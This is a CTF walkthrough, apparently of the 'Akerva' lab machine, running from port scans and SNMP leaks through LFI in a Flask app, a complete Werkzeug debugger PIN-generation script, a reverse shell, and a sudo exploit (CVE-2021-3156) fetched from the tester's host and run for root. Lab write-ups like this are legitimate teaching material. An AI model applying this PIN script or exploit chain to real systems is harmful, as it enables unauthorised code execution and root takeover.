# Nmap 
```
# Nmap 7.95 scan initiated Thu Jul 31 13:16:40 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.13.37.11
Nmap scan report for 10.13.37.11
Host is up (0.40s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da (RSA)
|   256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 (ECDSA)
|_  256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Root of the Universe &#8211; by @lydericlefebvre &amp; @akerva_fr
|_http-generator: WordPress 5.4-alpha-47225
5000/tcp open  http    Python BaseHTTPServer http.server 2 or 3.0 - 3.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
| http-auth: 
| HTTP/1.0 401 UNAUTHORIZED\x0D
|_  Basic realm=Authentication Required
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 31 13:22:11 2025 -- 1 IP address (1 host up) scanned in 330.59 seconds

```

# Page check
**index page (Port 80)**
![](images/Pasted%20image%2020250731131937.png)
From the source code of this page, you can find the first flag
```
<!-- Hello folks! -->
<!-- This machine is powered by @lydericlefebvre from Akerva company. -->
<!-- You have to find 8 flags on this machine. Have a nice root! -->
<!-- By the way, the first flag is: AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts} -->
```

Then I did not find anything interesting here, so I would continue to enumerate the valid web-contents here.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ ffuf -u http://10.13.37.11/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.37.11/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 544ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4034ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4034ms]
backups                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 277ms]
dev                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 293ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 551ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 237ms]
scripts                 [Status: 401, Size: 458, Words: 42, Lines: 15, Duration: 553ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 275ms]
wp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 222ms]
wp-content              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 247ms]
wp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 250ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 225ms]
:: Progress: [4746/4746] :: Job [1/1] :: 172 req/sec :: Duration: [0:00:47] :: Errors: 0 ::

```
From them, `/wp-admin` would redirect us to `login` page
```
http://10.13.37.11/wp-login.php?redirect_to=http%3A%2F%2F10.13.37.11%2Fwp-admin%2F&reauth=1
```
![](images/Pasted%20image%2020250731132426.png)
I have tried the default credit `admin:admin`, but it did not work.And we don't have any other valid credit here.

Let's walk around the other `http` service of port 5000
![](images/Pasted%20image%2020250731132556.png)
Great, still need the credit here.

# snmp enumerate
Now we have come into the rabbit hole, let's come to check the `UDP`services here.
```
nmap -sU -sC -sV -o nmap_udp 10.13.37.11

Nmap scan report for 10.13.37.11
Host is up (0.26s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 423f5e76cd7abe5e00000000
|   snmpEngineBoots: 6
|_  snmpEngineTime: 3h49m24s
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 3.22 Mb sent, 3.22 Mb received
|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
|     IP address: 10.13.37.11  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:e3:ed (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 365.04 Mb sent, 354.97 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:5000         0.0.0.0:0
|   TCP  10.13.37.11:5000     10.13.16.138:52188
......................
```

There is a `snmp` service for us, let's use `snmp-check` to help us to enumerate that service
```
snmpbulkwalk -c public -v2c 10.13.37.11 | grep AKERVA
iso.3.6.1.2.1.25.4.2.1.5.1254 = STRING: "/var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}"  
```
![](images/Pasted%20image%2020250731133558.png)

Besides that we can also find 2 wired scripts here 
```
/var/www/html/scripts/backup_every_17minutes.sh  
/var/www/html/dev/space_dev.py
```

Then I would try to get the script 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ curl -s 10.13.37.11/scripts/backup_every_17minutes.sh
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.13.37.11 Port 80</address>
</body></html>

```
It gives us the 401 unauthorized code here.
But if we change the `GET` request to `POST`request, we can find something different
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ curl -s -X POST 10.13.37.11/scripts/backup_every_17minutes.sh
#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
#
# AKERVA{IKNoW###VeRbTamper!nG_==}
#

SAVE_DIR=/var/www/html/backups

while true
do
        ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
        echo "Erasing old backups..."
        rm -rf $SAVE_DIR/*

        echo "Backuping..."
        zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

        echo "Done..."
        sleep 1020
done

```

The backup script backs up the web folder to a zip folder and then to the backup directory every 17 minutes
But we need to know the server's time, not our local time.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ curl -s 10.13.37.11 -I | grep Date  
Date: Thu, 31 Jul 2025 03:56:39 GMT
```

We can infer the time of the output backup file
```
%Y = 2025  
%m = 07
%d = 31
%H = 03
%M = 56
%S = 39
```

Then we can fuzz the valid backup file 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ wfuzz -c -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://10.13.37.11/backups/backup_2025073103FUZZ.zip -t 100 --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.11/backups/backup_2025073103FUZZ.zip
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                        
=====================================================================

000005650:   200        82458    808131 W   20937176    "5649"                                                                                                         
                        L                   Ch                                                                                                                         

Total time: 39.46867
Processed Requests: 10000
Filtered Requests: 9999
Requests/sec.: 253.3654

```
We successfully get he payload, let's download it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ wget http://10.13.37.11/backups/backup_20250731035649.zip                                                                               
--2025-07-31 13:45:03--  http://10.13.37.11/backups/backup_20250731035649.zip
Connecting to 10.13.37.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22071775 (21M) [application/zip]
Saving to: ‘backup_20250731035649.zip’

backup_20250731035649.zip                   100%[===========================================================================================>]  21.05M  1.70MB/s    in 30s     

2025-07-31 13:45:34 (728 KB/s) - ‘backup_20250731035649.zip’ saved [22071775/22071775]
```

Then we can find the `space_dev.py` from the `/var/www/html/dev`
```
#!/usr/bin/python

from flask import Flask, request
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
auth = HTTPBasicAuth()

users = {
        "aas": generate_password_hash("AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}")
        }

@auth.verify_password
def verify_password(username, password):
    if username in users:
        return check_password_hash(users.get(username), password)
    return False

@app.route('/')
@auth.login_required
def hello_world():
    return 'Hello, World!'

# TODO
@app.route('/download')
@auth.login_required
def download():
    return downloaded_file

@app.route("/file")
@auth.login_required
def file():
	filename = request.args.get('filename')
	try:
		with open(filename, 'r') as f:
			return f.read()
	except:
		return 'error'

if __name__ == '__main__':
    print(app)
    print(getattr(app, '__name__', getattr(app.__class__, '__name__')))
    app.run(host='0.0.0.0', port='5000', debug = True)
```

We can get the fourth flag here. And this flag is also the port 5000 service's credit
`aas:AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}`
![](images/Pasted%20image%2020250731134945.png)

# LFI the file system
When we want to check the `/download`
![](images/Pasted%20image%2020250731135106.png)
There is no global name or function `downloaded_file`

But we can `LFI` in the `/file`, it accepts an argument `filename`
![](images/Pasted%20image%2020250731135241.png)
```
Lyderic Lefebvre:/home/aas:/bin/bash
```
`aas` would be our target here.
We can get another flag here
![](images/Pasted%20image%2020250731135737.png)
But I did not find anything useful from that directory
![](images/Pasted%20image%2020250731135422.png)

Then I would continue to check the web-contents of  this port 5000 services
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ ffuf -u http://10.13.37.11:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt                     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.37.11:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 401, Size: 19, Words: 2, Lines: 1, Duration: 471ms]
console                 [Status: 200, Size: 1985, Words: 411, Lines: 53, Duration: 255ms]
download                [Status: 401, Size: 19, Words: 2, Lines: 1, Duration: 554ms]
file                    [Status: 401, Size: 19, Words: 2, Lines: 1, Duration: 237ms]
```
There is another `url` for us `/console`
![](images/Pasted%20image%2020250731135819.png)

But it needs a pin code here.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ curl -s 10.13.37.11:5000/console -I | grep Server  
Server: Werkzeug/0.16.0 Python/2.7.15+
```
We can know this console is `Werkzeug Debugger`

From the `hacktrick` we can find a exploited script to help us get the pin code
According to the exploit, we need:
```
username is the user who started this Flask

modname is flask.app

getattr(app, '__name__', getattr (app .__ class__, '__name__')) is Flask  

getattr(mod, '__file__', None) is the absolute path of an app.py in the flask directory
We can get the `/download`error message
#### /usr/local/lib/python2.7/dist-packages/flask/app.py

uuid.getnode() is the MAC address of the current computer, str (uuid.getnode ()) is the decimal expression of the mac address
By LFI to read /proc/net/dev to find active interface, we got ens33
```
![](images/Pasted%20image%2020250731140500.png)
![](images/Pasted%20image%2020250731140539.png)
change the mac address from hex to decimal
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ python3 -c 'print(0x005056b0c24e)' 
345051808334
```
get_machine_id() 
![](images/Pasted%20image%2020250731140826.png)

Then Let's change our exploited script here
```
import hashlib
from itertools import chain
probably_public_bits = [
	'aas',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),
]

private_bits = [
	'345051808334',# str(uuid.getnode()),  /sys/class/net/ens33/address
	'258f132cd7e647caaf5510e3aca997c1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
```
Then we can get the code and access to console
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ python3 exploit.py
238-222-144
```
![](images/Pasted%20image%2020250731141258.png)

Then we can use this console run any python command we wanted
![](images/Pasted%20image%2020250731141652.png)
```
──(wither㉿localhost)-[~/Templates/htb-labs/Akerva]
└─$ nc -lnvp 443   
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.37.11] 60416
bash: cannot set terminal process group (1239): Inappropriate ioctl for device
bash: no job control in this shell
aas@Leakage:~$ id
idw
uid=1000(aas) gid=1000(aas) groups=1000(aas),24(cdrom),30(dip),46(plugdev)
aas@Leakage:~$ whoami
```

Let's upgrade the shell
```
python3 -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo; fg
```

Then you can get another flag here
```
aas@Leakage:~$ ls -al
total 28
drwxr-xr-x 3 aas  aas  4096 Feb  9  2020 .
drwxr-xr-x 3 root root 4096 Feb  9  2020 ..
-rw------- 1 root root    0 Dec  7  2019 .bash_history
-rw-r--r-- 1 aas  aas   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aas  aas  3771 Apr  4  2018 .bashrc
-r-------- 1 aas  aas    21 Feb  9  2020 flag.txt
-rw-r--r-- 1 root root   38 Feb  9  2020 .hiddenflag.txt
dr-xr-x--- 2 aas  aas  4096 Feb 10  2020 .ssh
aas@Leakage:~$ cat .hiddenflag.txt
AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}

```

We can also add our public key to `.ssh`

# Privilege escalation
Considering that this machine was compromised around 2021, we can consider using so many exploits to escalate privileges.
```
aas@Leakage:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
There is a `CVE-2021-3156` could help us
`https://github.com/worawit/CVE-2021-3156.git`

Then we can get the root shell easily
```
aas@Leakage:/tmp$ wget http://10.10.14.5/exploit_nss.py
--2025-07-31 04:47:55--  http://10.10.14.5/exploit_nss.py
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8179 (8.0K) [text/x-python]
Saving to: ‘exploit_nss.py’

exploit_nss.py      100%[===================>]   7.99K  --.-KB/s    in 0s      

2025-07-31 04:47:55 (229 MB/s) - ‘exploit_nss.py’ saved [8179/8179]

aas@Leakage:/tmp$ python3 exploit_nss.py 
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(aas)

```

We can have another flag here, but we still have to crack the secured_note here.
```
# cat flag.txt
AKERVA{IkNow_Sud0_sUckS!}
# ls -al
total 28
drwx------  4 root root 4096 Feb  9  2020 .
drwxr-xr-x 24 root root 4096 Dec  7  2019 ..
-r--------  1 root root    0 Dec  7  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Feb  9  2020 .local
dr--------  2 root root 4096 Dec  7  2019 .ssh
-rw-r--r--  1 root root   26 Feb  9  2020 flag.txt
-r--------  1 root root  206 Feb  9  2020 secured_note.md
# cat secured_note.md
R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
U1BNSUhITU9EQVVLSEUK

@AKERVA_FR | @lydericlefebvre

```

It seems like be encoded by `base64`
Firstly decode it by `base64`
```
GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
```
It uses `Vigenère` encryption, so we can use `dcode.fr` to decode the message. We know that the flag starts with `AKERVA`, so we use `plaintext`. We also remove B,J,Q,X,Z because they are not in the message, so we will have `ACDEFGHIKLMNOPRSTUVWY`. By `decrypting` it we get a message
![](images/Pasted%20image%2020250731143416.png)
Then we can get the key `ILOVESPACE`
And we can get the fixed message
```
WELLDONEFORSOLVINGTHISCHALLENGEYOUCANSENDYOURRESUMEHEREATRECRUTEMENTAKERVACOMANDVALIDATETHELASTFLAGWITHAKERVAIKNOOOWVIGEEENERRRE

Well done for solving this challenge! You can send resume here at recrutement@akerva.com and validate the last flag with AKERVA IKNOOOWVIGEEENERRRE  

AKERVA{IKNOOOWVIGEEENERRRE}
```

# Description
Very basic and simple `CTF` challenge, not too confused
